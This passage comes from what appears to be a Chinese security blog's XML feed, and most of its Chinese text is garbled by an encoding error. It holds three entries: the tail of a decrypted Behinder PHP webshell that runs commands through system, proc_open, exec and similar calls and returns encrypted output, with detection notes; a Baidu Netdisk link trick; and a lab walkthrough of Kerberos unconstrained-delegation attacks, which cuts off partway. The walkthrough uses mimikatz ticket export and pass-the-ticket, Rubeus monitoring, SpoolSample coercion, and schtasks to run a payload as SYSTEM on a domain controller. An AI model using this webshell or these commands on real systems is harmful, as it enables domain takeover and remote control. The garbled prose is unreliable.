preg_replace('/[, ]+/', ',', $PadtJn);        $PadtJn = explode(',', $PadtJn);        $PadtJn = array_map('trim', $PadtJn);    &#125; else &#123;        $PadtJn = array();    &#125;    $c = $cmd;    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) &#123;        $c = $c . " 2>&1\n";    &#125;    $JueQDBH = 'is_callable';    $Bvce = 'in_array';    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) &#123;        ob_start();        system($c);        $kWJW = ob_get_contents();        ob_end_clean();    &#125; else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) &#123;        $handle = proc_open($c, array(            array(                'pipe',                'r'            ),            array(                'pipe',                'w'            ),            array(                'pipe',                'w'            )        ), $pipes);        $kWJW = NULL;        while (! feof($pipes[1])) &#123;            $kWJW .= fread($pipes[1], 1024);        &#125;        @proc_close($handle);    &#125; else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) &#123;        ob_start();        passthru($c);        $kWJW = ob_get_contents();        ob_end_clean();    &#125; else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) &#123;        $kWJW = shell_exec($c);    &#125; else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) &#123;        $kWJW = array();        exec($c, $kWJW);        $kWJW = join(chr(10), $kWJW) . chr(10);    &#125; else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) &#123;        $fp = popen($c, 'r');        $kWJW = NULL;        if (is_resource($fp)) &#123;            while (! feof($fp)) &#123;                $kWJW .= fread($fp, 1024);            &#125;        &#125;        @pclose($fp);    &#125; else &#123;        $kWJW = 0;        $result["status"] = base64_encode("fail");        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");        $key = $_SESSION['k'];        echo encrypt(json_encode($result));        return;            &#125;    $result["status"] = base64_encode("success");    $result["msg"] = base64_encode(getSafeStr($kWJW));    echo encrypt(json_encode($result));&#125;function Encrypt($data)&#123;    $key="e45e329feb5d925b"; for($i=0;$i<strlen($data);$i++) &#123;    $data[$i] = $data[$i]^$key[$i+1&15];     &#125;    $bs="base64_"."encode";$after=$bs($data."");    return $after;&#125;$cmd="Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJndob2FtaQ==";$cmd=base64_decode($cmd);$path="QzovcGhwU3R1ZHkvV1dXLw==";$path=base64_decode($path);main($cmd,$path);</code></pre><p>æ€»ç»“ç‰¹å¾å¦‚ä¸‹ï¼š</p><ol><li>æ²¡æœ‰æ˜¾ç¤ºæœ¨é©¬è¿æ¥å¯†ç ï¼ˆé»˜è®¤è¿æ¥å¯†ç ä¸º<code>rebeyond</code>ï¼Œå…¶md5å€¼çš„å‰16ä½è¢«ä½œä¸ºAESå¯†é’¥ï¼‰</li><li>Acceptå€¼<code> application/json, text/javascript, */*; q=0.01</code>æµè§ˆå™¨å¯æ¥å—ä»»ä½•æ–‡ä»¶ï¼Œä½†æœ€å€¾å‘ application&#x2F;json å’Œ text&#x2F;javascript</li><li>å¼±ç‰¹å¾ï¼šContent-type: Application&#x2F;x-www-form-urlencoded</li><li>@error_reporting(0); å…³é—­äº†æ‰€æœ‰çš„é”™è¯¯æŠ¥å‘Š</li><li>é•¿è¿æ¥ï¼šå†°èé€šè®¯é»˜è®¤ä½¿ç”¨é•¿è¿æ¥ï¼Œé¿å…äº†é¢‘ç¹çš„æ¡æ‰‹é€ æˆçš„èµ„æºå¼€é”€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¤´å’Œå“åº”å¤´é‡Œä¼šå¸¦æœ‰ Connection</li><li>è¿æ¥ç«¯å£åœ¨49700å·¦å³æ¯æ¬¡è¿æ¥å°±é€ä¸€å åŠ </li></ol>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿåº”æ€¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘ç™¾åº¦ç½‘ç›˜å°ç¨‹åºå¦‚ä½•åœ¨ç½‘é¡µä¸­æ‰“å¼€æå–</title>
      <link href="/2024/03/06/Extracurricular-experience-MiniProgram-BaiduNetdisk/"/>
      <url>/2024/03/06/Extracurricular-experience-MiniProgram-BaiduNetdisk/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…¶ä»–ç»éªŒã€‘ç™¾åº¦ç½‘ç›˜å°ç¨‹åºå¦‚ä½•åœ¨ç½‘é¡µä¸­æ‰“å¼€æå–"><a href="#ã€å…¶ä»–ç»éªŒã€‘ç™¾åº¦ç½‘ç›˜å°ç¨‹åºå¦‚ä½•åœ¨ç½‘é¡µä¸­æ‰“å¼€æå–" class="headerlink" title="ã€å…¶ä»–ç»éªŒã€‘ç™¾åº¦ç½‘ç›˜å°ç¨‹åºå¦‚ä½•åœ¨ç½‘é¡µä¸­æ‰“å¼€æå–"></a>ã€å…¶ä»–ç»éªŒã€‘ç™¾åº¦ç½‘ç›˜å°ç¨‹åºå¦‚ä½•åœ¨ç½‘é¡µä¸­æ‰“å¼€æå–</h1><h3 id="ä¸€ã€åœ¨ç½‘é¡µä¸­æ‰“å¼€å°ç¨‹åºç™¾åº¦ç½‘ç›˜èµ„æº"><a href="#ä¸€ã€åœ¨ç½‘é¡µä¸­æ‰“å¼€å°ç¨‹åºç™¾åº¦ç½‘ç›˜èµ„æº" class="headerlink" title="ä¸€ã€åœ¨ç½‘é¡µä¸­æ‰“å¼€å°ç¨‹åºç™¾åº¦ç½‘ç›˜èµ„æº"></a>ä¸€ã€åœ¨ç½‘é¡µä¸­æ‰“å¼€å°ç¨‹åºç™¾åº¦ç½‘ç›˜èµ„æº</h3><p>å½“å¥½å‹å‘äº†ä¸€ä¸ªå°ç¨‹åºç‰ˆçš„ç™¾åº¦ç½‘ç›˜èµ„æºï¼Œå´åªèƒ½åœ¨å°ç¨‹åºçš„ç™¾åº¦ç½‘ç›˜ä¸­æ‰“å¼€ä¿å­˜ï¼Œæ— æ³•ä¿å­˜è‡³å…¶ä»–ç½‘ç›˜ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ã€ä¸¾æŠ¥ã€‘â€”&gt;ã€ç‰ˆæƒæŠ•è¯‰ã€‘æœºåˆ¶è·å–è¯¥èµ„æºçš„é“¾æ¥</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306213816510.png" alt="image-20240306213816510"></p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214116811.png" alt="image-20240306214116811"></p><p>å¤åˆ¶é“¾æ¥ä¹‹åå³å¯åœ¨ç½‘é¡µä¸­æ‰“å¼€ï¼Œä½†è¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šéœ€è¦æå–ç </p><h3 id="äºŒã€è·å–è¯¥èµ„æºçš„æå–ç "><a href="#äºŒã€è·å–è¯¥èµ„æºçš„æå–ç " class="headerlink" title="äºŒã€è·å–è¯¥èµ„æºçš„æå–ç "></a>äºŒã€è·å–è¯¥èµ„æºçš„æå–ç </h3><p>æˆ‘ä»¬å¯ä»¥åˆ†äº«è¯¥èµ„æºåˆ°<strong>æ–‡ä»¶åŠ©æ‰‹æˆ–è‡ªå·±çš„å¥½å‹</strong>ï¼Œå†æ‰“å¼€åˆ†äº«åçš„èµ„æº</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214348028.png" alt="image-20240306214348028"></p><p>ç‚¹å‡»ä¸Šæ–¹çš„ä¸‰ä¸ªç‚¹ï¼Œä¾ç„¶ç‚¹å‡»æŠ•è¯‰</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214746035.png" alt="image-20240306214746035"></p><p>ä¹‹åé€‰æ‹©å¤åˆ¶é“¾æ¥</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214832043.png" alt="image-20240306214832043"></p><p>å†æ¬¡å‘é€åˆ°<strong>æ–‡ä»¶åŠ©æ‰‹æˆ–å¥½å‹</strong>ï¼Œå³å¯çœ‹åˆ°<code>&amp;pwd=æå–ç </code></p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306215121625.png" alt="image-20240306215121625"></p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™¾åº¦ç½‘ç›˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å†…ç½‘æ¨ªå‘ã€‘å†…ç½‘æ¸—é€æ¨ªå‘ç§»åŠ¨â€”å§”æ´¾æ”»å‡»</title>
      <link href="/2024/03/06/Intranet-Penetration-Delegation-attack/"/>
      <url>/2024/03/06/Intranet-Penetration-Delegation-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å†…ç½‘æ¨ªå‘ã€‘å†…ç½‘æ¸—é€æ¨ªå‘ç§»åŠ¨ï¼šå§”æ´¾æ”»å‡»"><a href="#ã€å†…ç½‘æ¨ªå‘ã€‘å†…ç½‘æ¸—é€æ¨ªå‘ç§»åŠ¨ï¼šå§”æ´¾æ”»å‡»" class="headerlink" title="ã€å†…ç½‘æ¨ªå‘ã€‘å†…ç½‘æ¸—é€æ¨ªå‘ç§»åŠ¨ï¼šå§”æ´¾æ”»å‡»"></a>ã€å†…ç½‘æ¨ªå‘ã€‘å†…ç½‘æ¸—é€æ¨ªå‘ç§»åŠ¨ï¼šå§”æ´¾æ”»å‡»</h1><h1 id="ä¸€ã€å§”æ´¾ä»‹ç»"><a href="#ä¸€ã€å§”æ´¾ä»‹ç»" class="headerlink" title="ä¸€ã€å§”æ´¾ä»‹ç»"></a>ä¸€ã€å§”æ´¾ä»‹ç»</h1><h2 id="1ã€å§”æ´¾ç®€ä»‹"><a href="#1ã€å§”æ´¾ç®€ä»‹" class="headerlink" title="1ã€å§”æ´¾ç®€ä»‹"></a>1ã€å§”æ´¾ç®€ä»‹</h2><p>åœ¨å†…ç½‘èº«ä»½è®¤è¯çš„<code>Kerberos</code> è®¤è¯ä¸­ï¼Œéœ€è¦ç»è¿‡ä¸¤æ¬¡ç¥¨æ®è®¤è¯ï¼Œåˆ†åˆ«æ˜¯TGT å’ŒST è®¤è¯ã€‚é‚£ä¹ˆæ­¤æ—¶æœ‰ä¸€ç§æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥å§”æ‰˜ä¸­é—´å•†å¸®æˆ‘ä»¬è¿›è¡Œç¥¨æ®è®¤è¯ï¼Œè€Œä¸å¿…æˆ‘ä»¬äº²è‡ªå‰å¾€è®¤è¯ï¼Œé‚£ä¹ˆè¿™ç§æœåŠ¡å°±æ˜¯å§”æ´¾ã€‚</p><p>ä½†å¦‚æœè®¾ç½®äº†ä¸æ­£ç¡®çš„å§”æ´¾ï¼Œå¯èƒ½ä¼šè¢«æ¶æ„åˆ©ç”¨ï¼ŒåŠ é€Ÿå†…ç½‘çš„æ²¦é™·ã€‚</p><h2 id="2ã€å§”æ´¾çš„åˆ†ç±»"><a href="#2ã€å§”æ´¾çš„åˆ†ç±»" class="headerlink" title="2ã€å§”æ´¾çš„åˆ†ç±»"></a>2ã€å§”æ´¾çš„åˆ†ç±»</h2><ol><li><strong>éçº¦æŸæ€§å§”æ´¾ï¼š</strong>å³æ²¡æœ‰æœåŠ¡è®¿é—®é™åˆ¶çš„å§”æ´¾ï¼Œå§”æ´¾äº†ä»»ä½•æœåŠ¡</li><li><strong>çº¦æŸæ€§å§”æ´¾ï¼š</strong>æœ‰æœåŠ¡è®¿é—®é™åˆ¶ï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</li><li><strong>åŸºäºèµ„æºçš„å§”æ´¾ï¼š</strong>åœ¨Windows Server 2012ä¸­å¼•å…¥ï¼Œä¸éœ€è¦åŸŸç®¡ç†å‘˜æƒé™å°±å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œå¯ä»¥å°†èµ„æºå§”æ´¾ç»™å—ä¿¡ä»»çš„è´¦æˆ·ã€‚çº¦æŸæ€§å§”æ´¾ä¸èƒ½è·¨åŸŸå§”æ´¾ï¼Œè€ŒåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å¯ä»¥è·¨åŸŸå’Œæ—</li></ol><h2 id="3ã€å§”æ´¾æ”»å‡»çš„å·¥ä½œåœºæ™¯"><a href="#3ã€å§”æ´¾æ”»å‡»çš„å·¥ä½œåœºæ™¯" class="headerlink" title="3ã€å§”æ´¾æ”»å‡»çš„å·¥ä½œåœºæ™¯"></a>3ã€å§”æ´¾æ”»å‡»çš„å·¥ä½œåœºæ™¯</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%9C%BA%E6%99%AF.png"></p><p>æ­¤æ—¶å°±æ˜¯webç³»ç»Ÿè¢«èµ‹äºˆäº†å§”æ´¾ï¼Œç”¨æˆ·Aå»è®¿é—®webç³»ç»Ÿçš„æ—¶å€™ï¼ŒKDCå°†ä¼šæŠŠç”¨æˆ·A çš„TGTç»™webï¼Œwebå°±å¯ä»¥æ‹¿ç€Açš„TGTå»è®¿é—®æ–‡ä»¶æœåŠ¡å™¨ã€‚å¦‚æœç”¨æˆ·Aæ˜¯åŸŸç®¡çš„è¯ï¼Œå°†ä¼šæœ‰å¾ˆå¤šçš„æƒé™ã€‚</p><h2 id="4ã€è®¾ç½®å§”æ´¾"><a href="#4ã€è®¾ç½®å§”æ´¾" class="headerlink" title="4ã€è®¾ç½®å§”æ´¾"></a>4ã€è®¾ç½®å§”æ´¾</h2><p>åœ¨åŸŸå†…åªæœ‰ä¸»æœºè´¦å·å’ŒæœåŠ¡è´¦å·æ‰æœ‰å§”æ´¾å±æ€§ã€‚</p><p>ä¸»æœºè´¦å·ï¼šæ´»åŠ¨ç›®å½•ä¸­çš„computersç»„å†…çš„è®¡ç®—æœºï¼Œä¹Ÿè¢«ç§°ä¸ºæœºå™¨è´¦å·ã€‚ï¼ˆåŸŸå§”æ´¾åªèƒ½ç»™æŸä¸ªåŸŸæœºå™¨æˆ–æœºå™¨ä¸Šçš„<strong>æœåŠ¡è´¦å·ï¼ŒåŸŸç®¡</strong>ä¹Ÿä¸èƒ½ç»™ã€‚ï¼‰<img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162305953.png" alt="image-20231121162305953"></p><p>æœåŠ¡è´¦å·ï¼šåŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼Œæ˜¯æœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥åŠ å…¥åŸŸå†…ï¼Œæ¯”å¦‚ï¼šSQLServer,MYSQLç­‰ï¼›åŸŸç”¨æˆ·é€šè¿‡æ³¨å†ŒSPNä¹Ÿèƒ½æˆä¸ºæœåŠ¡è´¦å·ã€‚</p><p><strong>1ã€åˆ›å»ºæœåŠ¡è´¦å·</strong></p><p>æœåŠ¡è´¦å·ï¼šå¦‚SQLServerã€MYSQLç­‰ã€‚åˆ›å»ºæœåŠ¡è´¦å·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test123 Admin@123 /add /domain//åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·</span><br><span class="line">setspn -U -A priv/test test123//æ³¨å†Œä¸ºæœåŠ¡è´¦å·</span><br></pre></td></tr></table></figure><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162410467.png" alt="image-20231121162410467" style="zoom:150%;" /><p><strong>2ã€å¼€å¯å§”æ´¾å¦‚å›¾</strong></p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162446733.png" alt="image-20231121162446733"></p><h1 id="äºŒã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#äºŒã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="äºŒã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>äºŒã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»</h1><h2 id="1ã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»åˆ©ç”¨åŸç†"><a href="#1ã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»åˆ©ç”¨åŸç†" class="headerlink" title="1ã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»åˆ©ç”¨åŸç†"></a>1ã€éçº¦æŸæ€§å§”æ´¾æ”»å‡»åˆ©ç”¨åŸç†</h2><p>è‹¥æŸå°ä¸»æœºè¢«è®¾ç½®ä¸ºäº†éçº¦æŸå§”æ´¾æ—¶ï¼Œå½“ä¸€ä¸ªç”¨æˆ·è®¿é—®æ­¤ä¸»æœºæ—¶ï¼Œä¼šæŠŠè‡ªå·±çš„TGTå‘é€ç»™æ­¤ä¸»æœºï¼ŒåŒæ—¶ï¼Œæ­¤TGTä¼šè¢«ä¿å­˜åœ¨è¯¥ä¸»æœºå†…å­˜ï¼ˆlsass.exeï¼‰ä¸­ä»¥ä¾¿åç»­ä½¿ç”¨ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥è¯±å¯¼åŸŸæ§åˆ¶å™¨è®¿é—®æ­¤ä¸»æœºï¼ŒåŸŸæ§åˆ¶å™¨å°±ä¼šæŠŠå®ƒçš„TGTå‘é€åˆ°æ­¤ä¸»æœºä¸Šï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä¸æ§åˆ¶å™¨çš„TGTå°±å¯ä»¥ç”Ÿæˆé»„é‡‘ç¥¨æ®ã€‚</p><p><strong>åˆ©ç”¨å‰æï¼š</strong>æˆ‘ä»¬æ­¤æ—¶æ§åˆ¶äº†webæœºå™¨ï¼Œå¹¶ä¸”webæœºå™¨è¢«èµ‹äºˆäº†éçº¦æŸæ€§å§”æ´¾ã€‚æ­¤æ—¶åªéœ€è¦è®©åŸŸç®¡è¿™ä¸ªè´¦å·è®¿é—®webæœºå™¨ï¼Œwebæœºå™¨å°±èƒ½æ‹¿åˆ°åŸŸç®¡çš„TGTï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼Œè¿›è€Œå°±å¯ä»¥è®¿é—®ä»»ä½•æœºå™¨ã€‚</p><h2 id="1ã€æŸ¥è¯¢éçº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯"><a href="#1ã€æŸ¥è¯¢éçº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯" class="headerlink" title="1ã€æŸ¥è¯¢éçº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯"></a>1ã€æŸ¥è¯¢éçº¦æŸæ€§å§”æ´¾æœºå™¨å’Œç”¨æˆ·ä¿¡æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//éœ€è¦åŸŸç”¨æˆ·æƒé™ï¼Œä¸‹é¢å¡«å†™god.orgå°±å¯ä»¥äº†ã€‚</span><br><span class="line">ä½¿ç”¨AdfindæŸ¥è¯¢åŸŸå†…éçº¦æŸå§”æ´¾æœºå™¨è´¦å·ï¼š</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line">æŸ¥è¯¢å…·æœ‰å§”æ´¾çš„æœåŠ¡è´¦å·ï¼š</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121171335033.png" alt="image-20231121171335033"><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121171358610.png" alt="image-20231121171358610"></p><h2 id="2ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§ä¸»åŠ¨è®¿é—®æ§åˆ¶åŸŸ"><a href="#2ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§ä¸»åŠ¨è®¿é—®æ§åˆ¶åŸŸ" class="headerlink" title="2ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§ä¸»åŠ¨è®¿é—®æ§åˆ¶åŸŸ"></a>2ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§ä¸»åŠ¨è®¿é—®æ§åˆ¶åŸŸ</h2><h3 id="1ã€å®éªŒç¯å¢ƒï¼š"><a href="#1ã€å®éªŒç¯å¢ƒï¼š" class="headerlink" title="1ã€å®éªŒç¯å¢ƒï¼š"></a>1ã€å®éªŒç¯å¢ƒï¼š</h3><p>ä¸€å°åŸŸæ§DCã€ä¸€å°åŸŸå†…webæœºå™¨ã€‚</p><p>å®éªŒå‰æï¼šæˆ‘ä»¬æ§åˆ¶äº†webæœºå™¨ï¼Œä¸”æ­¤webæœºå™¨çš„é…ç½®äº†éçº¦æŸæ€§å§”æ´¾ã€‚</p><h3 id="2ã€å®éªŒæ­¥éª¤"><a href="#2ã€å®éªŒæ­¥éª¤" class="headerlink" title="2ã€å®éªŒæ­¥éª¤"></a>2ã€å®éªŒæ­¥éª¤</h3><ol><li><p>æˆ‘ä»¬åœ¨webæœºå™¨ä¸Šå…ˆå»è®¿é—®åŸŸæ§ï¼Œæ˜¯ä¸èƒ½è®¿é—®çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li><li><p>åœ¨åŸŸæ§ä¸Šä¸»åŠ¨è®¿é—®webæœºå™¨ï¼ˆåœ¨å®æˆ˜ä¸­æ˜¯éœ€è¦éœ€è¦ç­‰å¾…åŸŸç®¡å»è®¿é—®æˆ‘ä»¬æ§åˆ¶çš„è¿™å°webæœºå™¨ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†åŸŸç®¡çš„TGTï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\PC-WEB.HACK.COM /user:hack\administrator Admin@123</span><br><span class="line">//åœ¨åŸŸæ§ä¸Šæ‰§è¡Œï¼Œä½¿ç”¨åŸŸç®¡çš„è´¦å·å¯†ç ã€‚æ¥æ¨¡æ‹ŸåŸŸç®¡è®¿é—®webæœºå™¨ã€‚</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121173326727.png" alt="image-20231121173326727"></p></li><li><p>å›åˆ°webæœºå™¨ï¼Œå¯¼å‡ºç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></li><li><p>è¿›è¡Œå¯¼å…¥ç¥¨æ®ä¼ é€’è·å–åŸŸæ§æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;54acdf]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>å†æ¬¡è®¿é—®åŸŸæ§æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li><li><p>é…åˆè®¡åˆ’ä»»åŠ¡ç­‰ä¸Šçº¿DC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 123.exe \\dc.hack.com\C$</span><br><span class="line">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\123.exe /ru system /f</span><br><span class="line">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="3ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§è¢«åŠ¨è®¿é—®æ§åˆ¶åŸŸæ§"><a href="#3ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§è¢«åŠ¨è®¿é—®æ§åˆ¶åŸŸæ§" class="headerlink" title="3ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§è¢«åŠ¨è®¿é—®æ§åˆ¶åŸŸæ§"></a>3ã€åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾åŸŸæ§è¢«åŠ¨è®¿é—®æ§åˆ¶åŸŸæ§</h2><h3 id="1ã€å®éªŒç¯å¢ƒ"><a href="#1ã€å®éªŒç¯å¢ƒ" class="headerlink" title="1ã€å®éªŒç¯å¢ƒ"></a>1ã€å®éªŒç¯å¢ƒ</h3><p>ä¸€å°DCåŸŸæ§ã€ä¸€å°OAåŸŸå†…æœºå™¨ï¼Œè·Ÿä¸Šè¿°å®éªŒçš„webçš„æ€§è´¨æ˜¯ä¸€æ ·ã€‚</p><p>å®éªŒå‰æï¼šæ§åˆ¶äº†OAï¼Œä¸”OAæœ‰éçº¦æŸæ€§å§”æ´¾ã€‚</p><h3 id="2ã€å®éªŒæ€è·¯"><a href="#2ã€å®éªŒæ€è·¯" class="headerlink" title="2ã€å®éªŒæ€è·¯"></a>2ã€å®éªŒæ€è·¯</h3><p>ä¸€èˆ¬åŸŸç®¡ä¸ä¼šä¸»åŠ¨è®¿é—®æˆ‘ä»¬ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨windowsæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®ï¼ˆMS-RPRNï¼‰ä¸­çš„ä¸€ç§æ—§çš„ä½†æ˜¯é»˜è®¤å¯åŠ¨çš„æ–¹æ³•ã€‚åŸŸç”¨æˆ·å¯ä»¥ä½¿ç”¨MS-RPRNæ–¹æ³•å¼ºåˆ¶ä»»ä½•è¿è¡Œäº†SpooleræœåŠ¡çš„è®¡ç®—æœºé€šè¿‡kerberosåè®®æˆ–è€…NTLMå¯¹æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p><p>éçº¦æŸæ€§å§”æ´¾ç»“åˆSpooleræ‰“å°æœºæœåŠ¡æ¼æ´ï¼Œè®©åŸŸæ§æœºDCå¼ºåˆ¶è®¿é—®æœ‰éçº¦æŸæ€§å§”æ´¾çš„OAæœºå™¨ï¼Œä»è€Œæ‹¿åˆ°åŸŸç®¡çš„TGTï¼Œè¿›è€Œæ§åˆ¶åŸŸç®¡ã€‚ï¼ˆ2008å¯èƒ½å¤ç°ä¸æ¥ï¼Œç‰ˆæœ¬é—®é¢˜ï¼‰</p><h3 id="3ã€å®éªŒæ­¥éª¤"><a href="#3ã€å®éªŒæ­¥éª¤" class="headerlink" title="3ã€å®éªŒæ­¥éª¤"></a>3ã€å®éªŒæ­¥éª¤</h3><ol><li><p>åˆ©ç”¨Rubeusåœ¨OAä¸Šä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä½œç”¨æ˜¯æ¯éš”ä¸€ç§’ç›‘å¬æ¥è‡ªåŸŸæ§æœºå™¨DCçš„ç™»é™†ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line">//DC$æ˜¯æœºå™¨å</span><br></pre></td></tr></table></figure></li><li><p>å†åˆ©ç”¨SpoolSampleå¼ºåˆ¶åŸŸæ§æ‰“å°æœºå›è¿ï¼Œéœ€åœ¨åŸŸç”¨æˆ·è¿›ç¨‹ä¸Šæ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œåˆ‡æ¢æˆäº†æ™®é€šåŸŸç”¨æˆ·å¸å·å»æ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC OA//å¼ºåˆ¶è®©DCè®¿é—®OA</span><br></pre></td></tr></table></figure></li><li><p>Rubeusç›‘å¬åˆ°ç¥¨æ®ã€‚<img src="/img/Intranet-Penetration-Delegation-attack/Rubeus%E7%9B%91%E5%90%AC%E5%BE%97%E5%88%B0%E7%9A%84%E7%A5%A8%E6%8D%AE.png"></p></li><li><p>Rubeuså¯¼å…¥ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:ç¥¨æ®å†…å®¹</span><br><span class="line">//ç¥¨æ®å†…å®¹å°±æ˜¯é•¿é•¿çš„ä¸€å¤§å¨çš„Beas64ç¼–ç çš„å†…å®¹</span><br><span class="line">//æ³¨æ„ä¸èƒ½æœ‰ç©ºæ 